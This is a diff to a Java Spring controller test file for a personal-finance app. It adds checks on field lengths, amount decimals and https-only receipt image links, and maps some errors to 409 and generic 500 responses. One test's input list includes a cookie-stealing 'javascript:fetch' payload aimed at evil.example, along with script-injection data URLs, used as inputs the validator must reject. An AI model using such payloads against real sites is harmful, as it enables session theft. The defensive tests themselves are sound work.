@@ -32,6 +32,7 @@ import vn.edu.huit.finance.core.Entity.Transaction;
 import vn.edu.huit.finance.core.Entity.User;
 import vn.edu.huit.finance.core.Exception.DuplicateReceiptException;
 import vn.edu.huit.finance.core.Exception.GlobalExceptionHandler;
+import vn.edu.huit.finance.core.Exception.ReceiptConflictException;
 import vn.edu.huit.finance.core.Exception.InsufficientBalanceException;
 import vn.edu.huit.finance.core.Exception.InvalidCategoryException;
 import vn.edu.huit.finance.core.Exception.InvalidSortFieldException;
@@ -50,6 +51,7 @@ import vn.edu.huit.finance.core.Service.LoginAttemptService;
 import vn.edu.huit.finance.core.Service.Search.TransactionSearchService;
 import vn.edu.huit.finance.core.Service.TokenBlacklistService;
 import vn.edu.huit.finance.core.Service.TransactionService;
+import vn.edu.huit.finance.core.Util.ImageUrls;
 
 import java.lang.reflect.Method;
 import java.lang.reflect.Parameter;
@@ -450,6 +452,92 @@ class TransactionControllerTest {
         verifyNoInteractions(transactionService);
     }
 
+    // ------------------------------------------------------------- POST /checkout: field limits (A11)
+
+    @ParameterizedTest
+    @ValueSource(strings = {"note", "location", "paymentMethod", "categoryName"})
+    void aTextLongerThanItsColumnIsRejectedWith400(String field) throws Exception {
+        String tooLong = "x".repeat(256);
+        String body = "{\"amount\":10000,\"location\":\"Quán A\",\"paymentMethod\":\"Ví chính\","
+                + "\"transactionDate\":\"2026-09-01T08:30:00\",\"categoryId\":10,\"isExpense\":true,"
+                + "\"" + field + "\":\"" + tooLong + "\"}";
+
+        mockMvc.perform(signedIn(withBody(HttpMethod.POST, URL + "/checkout", body)))
+                .andExpect(status().isBadRequest())
+                .andExpect(jsonPath("$.code").value(400))
+                .andExpect(jsonPath("$.message").value(startsWith(VALIDATION_PREFIX)));
+
+        verifyNoInteractions(transactionService);
+    }
+
+    @Test
+    void aNoteOf300CharactersIsA400() throws Exception {
+        mockMvc.perform(signedIn(withBody(HttpMethod.POST, URL + "/checkout",
+                        checkoutBodyWith(",\"note\":\"" + "n".repeat(300) + "\""))))
+                .andExpect(status().isBadRequest())
+                .andExpect(jsonPath("$.message").value(containsString("Ghi chú tối đa 255 ký tự")));
+    }
+
+    @Test
+    void anAmountWithThreeDecimalsIsA400_soTheWalletNeverMovesByAnUnroundedAmount() throws Exception {
+        String body = "{\"amount\":10000.555,\"location\":\"Quán A\",\"paymentMethod\":\"Ví chính\","
+                + "\"transactionDate\":\"2026-09-01T08:30:00\",\"categoryId\":10,\"isExpense\":true}";
+
+        mockMvc.perform(signedIn(withBody(HttpMethod.POST, URL + "/checkout", body)))
+                .andExpect(status().isBadRequest());
+
+        verifyNoInteractions(transactionService);
+    }
+
+    @Test
+    void textsOfExactly255CharactersAndTwoDecimalsAreAccepted() throws Exception {
+        when(transactionService.createMyTransaction(any())).thenReturn(Map.of("transactionId", 5));
+        String widest = "x".repeat(255);
+        String body = "{\"amount\":10000.55,\"location\":\"" + widest + "\",\"paymentMethod\":\"" + widest + "\","
+                + "\"transactionDate\":\"2026-09-01T08:30:00\",\"categoryId\":10,\"isExpense\":true,\"note\":\"" + widest + "\"}";
+
+        mockMvc.perform(signedIn(withBody(HttpMethod.POST, URL + "/checkout", body)))
+                .andExpect(status().isOk());
+    }
+
+    // ------------------------------------------------------------- POST /checkout: the receipt image link (A9)
+
+    @ParameterizedTest
+    @ValueSource(strings = {"javascript:fetch('//evil.example/'+document.cookie)", "JavaScript:alert(1)",
+            "data:text/html,<script>alert(1)</script>", "http://img.example.com/1.jpg", "https://img.example.com/a b.jpg",
+            "//img.example.com/1.jpg"})
+    void aReceiptImageLinkThatIsNotHttpsIsRejectedWith400AndNeverReachesTheService(String imageUrl) throws Exception {
+        String body = checkoutBodyWith(",\"imageUrl\":\"" + imageUrl.replace("\"", "\\\"") + "\"");
+
+        mockMvc.perform(signedIn(withBody(HttpMethod.POST, URL + "/checkout", body)))
+                .andExpect(status().isBadRequest())
+                .andExpect(jsonPath("$.code").value(400))
+                .andExpect(jsonPath("$.message").value(containsString(ImageUrls.MSG_INVALID)));
+
+        verifyNoInteractions(transactionService);
+    }
+
+    @Test
+    void aReceiptImageLinkLongerThanTheColumnIsRejectedWith400() throws Exception {
+        String prefix = "https://img.example.com/";
+        String tooLong = prefix + "x".repeat(ImageUrls.MAX_LENGTH - prefix.length() + 1);
+
+        mockMvc.perform(signedIn(withBody(HttpMethod.POST, URL + "/checkout", checkoutBodyWith(",\"imageUrl\":\"" + tooLong + "\""))))
+                .andExpect(status().isBadRequest());
+
+        verifyNoInteractions(transactionService);
+    }
+
+    @ParameterizedTest
+    @ValueSource(strings = {",\"imageUrl\":\"https://res.cloudinary.com/demo/image/upload/v1/r.jpg\"",
+            ",\"imageUrl\":\"HTTPS://img.example.com/1.jpg\"", ",\"imageUrl\":\"\"", ",\"imageUrl\":null", ""})
+    void anHttpsReceiptImageLinkOrNoneIsAccepted(String extraFields) throws Exception {
+        when(transactionService.createMyTransaction(any())).thenReturn(Map.of("transactionId", 5));
+
+        mockMvc.perform(signedIn(withBody(HttpMethod.POST, URL + "/checkout", checkoutBodyWith(extraFields))))
+                .andExpect(status().isOk());
+    }
+
     // ------------------------------------------------------------- POST /checkout: the answer of the AI for a scan
 
     @Test
@@ -567,8 +655,11 @@ class TransactionControllerTest {
         return Stream.of(
                 Arguments.of(new TransactionAccessDeniedException("Bạn không có quyền hủy hóa đơn này"), 403, "Bạn không có quyền hủy hóa đơn này"),
                 Arguments.of(new ReceiptNotFoundException("Không tìm thấy hóa đơn"), 404, "Không tìm thấy hóa đơn"),
-                Arguments.of(new IllegalStateException("Chỉ có thể hủy hóa đơn đang ở trạng thái Chờ xử lý"), 400,
-                        "Chỉ có thể hủy hóa đơn đang ở trạng thái Chờ xử lý"));
+                Arguments.of(new ReceiptConflictException("Chỉ có thể hủy hóa đơn đang ở trạng thái Chờ xử lý"), 409,
+                        "Chỉ có thể hủy hóa đơn đang ở trạng thái Chờ xử lý"),
+                // A4: a RuntimeException without a handler of its own is a 500 with a fixed text, its message stays in the log.
+                Arguments.of(new RuntimeException("org.postgresql.util.PSQLException: relation receipts"), 500,
+                        "Hệ thống đang gặp sự cố, vui lòng thử lại sau"));
     }
 
     @Test
